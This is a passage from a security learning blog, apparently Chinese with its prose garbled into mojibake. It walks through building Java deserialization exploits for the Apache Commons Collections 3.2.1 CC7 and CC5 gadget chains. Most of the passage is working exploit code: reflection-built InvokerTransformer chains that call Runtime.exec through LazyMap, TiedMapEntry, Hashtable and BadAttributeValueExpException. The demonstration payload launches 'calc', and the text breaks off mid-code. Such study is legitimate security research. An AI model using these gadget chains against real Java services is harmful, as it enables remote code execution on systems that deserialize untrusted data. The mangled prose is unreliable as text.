class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);  </span><br><span class="line">        decorateMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);  </span><br><span class="line">        decorateMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();  </span><br><span class="line">        hashtable.put(decorateMap1, <span class="number">1</span>);  </span><br><span class="line">        hashtable.put(decorateMap2, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ChainedTransformer.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(chainedTransformer, transformers);  </span><br><span class="line">        decorateMap2.remove(<span class="string">&quot;yy&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(hashtable);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091354569.png" alt="image-20230709135450394"></li></ul><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p>è¿™æ¡é“¾å­è·Ÿçš„æ¯”è¾ƒéš¾å—ï¼Œä¸­é€”æˆ‘ideaè°ƒè¯•çš„æ—¶å€™å‡ºç°äº†ç„å­¦é—®é¢˜ï¼Œä¸ç®¡æ€ä¹ˆæˆ‘æ€ä¹ˆå¼„Hashtableè¿™ä¸ªç±»ï¼Œå¼„äº†åŠå¤©æ²¡å¼„å¥½ä¸­é—´æœ‰äº‹å„¿å»äº†æ²¡å¼„äº†ï¼Œç­‰æˆ‘ç¬¬äºŒå¤©æ¥è°ƒå‘ç°çªç„¶åˆå¥½äº†ä½†æ˜¯æ­¤æ—¶æ€è·¯æ²¡æœ‰ä¸€å¼€å§‹é‚£ä¹ˆæ¸…æ™°äº†ï¼Œæˆ‘ä¹Ÿæ‡’å¾—å†é‡æ–°åˆ†æäº†ä»¥ååˆ·é¢˜çš„æ—¶å€™å†å¼„ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091355993.png" alt="image-20230709135500947"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾5</title>
      <link href="/undefined/29398.html"/>
      <url>/undefined/29398.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>commons-collectionsç‰ˆæœ¬å¦‚ä¸‹ï¼Œè¿™é‡Œæˆ‘ä¸€ç›´å‚è€ƒçš„åšå®¢æ²¡è¯´ï¼Œä½†å¦‚æœæ˜¯4.0çš„è¯æ˜¯æœ‰é—®é¢˜çš„åé¢ä¼šæåˆ°ï¼Œå…¶å®ƒç¯å¢ƒæ²¡å˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>CC5å°±æ˜¯æ”¹äº†å…¥å£ç‚¹ç„¶åå’ŒCC1çš„LazyMapè¿æ¥èµ·æ¥ï¼Œç»„é•¿åé¢ä¸¤æ¡é“¾å­æ²¡æœ‰è¯¦ç»†è®²äº†ï¼Œå› ä¸ºå¤§åŒå°å¼‚ï¼Œè¿™é‡Œç›´æ¥ç»™äº†å…¥å£ç±»ï¼Œå› ä¸ºè¿™æ¡é“¾å­è‡ªå·±å»æ‰¾è¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œä¸º<code>BadAttributeValueExpException</code> çš„ <code>readObject()</code>æ–¹æ³•ï¼Œç„¶åè¦å’Œ<code>LazyMap.get()</code>è¿ä¸Šï¼Œé‚£ä¹ˆå°±æ˜¯æ‰¾è°è°ƒç”¨äº†<code>get()</code>æ–¹æ³•è¿™é‡Œå¦‚æœå»find usageså»æ‰¾çš„è¯å¾ˆéº»çƒ¦ï¼Œè°ƒç”¨å®åœ¨å¤ªå¤šäº†å°±ç›´æ¥çœ‹å§ï¼Œæœ€åæ˜¯æ‰¾åˆ°äº†<code>TiedMapEntry</code>ç±»çš„<code>getValue()</code>æ–¹æ³•è°ƒç”¨äº†<code>LazyMap.get()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091343468.png" alt="image-20230709134237186"><br>è¿™é‡Œçš„mapå°±æ˜¯<code>LazyMap</code>çš„å¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨ç»™TiedMapEntryç±»å®ä¾‹åŒ–çš„æ—¶å€™ä¼šä¼ <code>LazyMap</code>ï¼Œè€Œè¿™ä¸ªç±»çš„<code>toString()</code>æ–¹æ³•è°ƒç”¨äº†<code>getValue()</code>æ–¹æ³•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŠŠ<code>TiedMapEntry</code>ç±»çš„<code>toString()</code>æ–¹æ³•å’Œå…¥å£ç±»<code>BadAttributeValueExpException</code> çš„ <code>readObject()</code>æ–¹æ³•è¿èµ·æ¥è¿™æ¡é“¾å­å°±å®Œæˆäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091343096.png" alt="image-20230709134339935"><br>å‘ç°readObjectæ–¹æ³•è¿™é‡Œ<code>valObj</code>è°ƒç”¨äº†<code>toString()</code>æ–¹æ³•ï¼Œæƒ³åŠæ³•è®©<code>valObj</code>å˜ä¸º<code>TiedMapEntry</code>ç±»çš„å¯¹è±¡å°±è¡Œäº†ï¼Œå…ˆçœ‹ä¸€ä¸‹å®ƒçš„åˆå§‹åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();  </span><br><span class="line"><span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå…¶å®<code>valObj</code>å°±æ˜¯<code>val</code>è€Œ<code>val</code>å°±æ˜¯<code>BadAttributeValueExpException</code> ç±»ä¸­ç›´æ¥å®šä¹‰çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344942.png" alt="image-20230709134416810"><br>é‚£ä¹ˆé€šè¿‡åå°„ä¿®æ”¹å°±è¡Œäº†ï¼Œå†æ¥çœ‹ä¸ºä»€ä¹ˆ<code>BadAttributeValueExpException</code> ç±»å¯ä»¥ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>   &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exception</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Throwable</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤é“¾å­åˆ†æå°±ç»“æŸäº†</p><h2 id="EXPç¼–å†™"><a href="#EXPç¼–å†™" class="headerlink" title="EXPç¼–å†™"></a>EXPç¼–å†™</h2><p>åé¢çš„å‘½ä»¤æ‰§è¡ŒCC1çš„LazyMapå¯ä»¥ç”¨æ‰€ä»¥ç›´æ¥æ‹¿è¿‡æ¥å°±è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">LazyMapget</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        LazyMapget.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        LazyMapget.invoke(decorateMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344744.png" alt="image-20230709134433612"><br>æ‰§è¡ŒæˆåŠŸï¼Œåœ¨è¿™é‡Œæˆ‘å‘ç°commons-collectionsç‰ˆæœ¬å¾—ç”¨3.2.1ä¸ç„¶ä¸‹é¢è¿™ä¸ªåœ°æ–¹å°±ä¼šæŠ¥é”™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091347346.png" alt="image-20230709134754280"><br>å› ä¸ºåœ¨<code>commons-collections 4.0</code>ç‰ˆæœ¬LazyMapé‡Œé¢æ²¡æœ‰è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344900.png" alt="image-20230709134451829"><br>é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¾—æŠŠ<code>TiedMapEntry</code>ç±»å’Œ<code>LazyMap</code>ç±»è¿èµ·æ¥ï¼Œé‚£ä¹ˆå…ˆçœ‹ä¸€çœ‹è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(<span class="keyword">final</span> Map&lt;K, V&gt; map, <span class="keyword">final</span> K key)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    <span class="built_in">this</span>.map = map;  </span><br><span class="line">    <span class="built_in">this</span>.key = key;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªpublicç±»é‚£ä¹ˆè°ƒç”¨å°±æ›´åŠ ç®€å•äº†ï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€è¦æŠŠLazyMapçš„å¯¹è±¡decorateMapä¼ å…¥å³å¯ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        tiedMapEntry.toString();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨å°±æ˜¯å’Œå…¥å£ç±»è¿èµ·æ¥ï¼Œ<code>BadAttributeValueExpException</code> çš„ä½œç”¨åŸŸæ˜¯publicæ‰€ä»¥ç›´æ¥newä¸€ä¸ªå¯¹è±¡å°±è¡Œï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è®©<code>val</code>å˜ä¸º<code>TiedMapEntry</code>çš„å¯¹è±¡ï¼Œå› ä¸ºè¿™ä¸ªå˜é‡æ˜¯ç§æœ‰çš„æ‰€ä»¥åˆ©ç”¨åå°„ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);  </span><br><span class="line"><span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">declaredField.set(badAttributeValueExpException,tiedMapEntry);</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œå®Œæ•´EXPå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 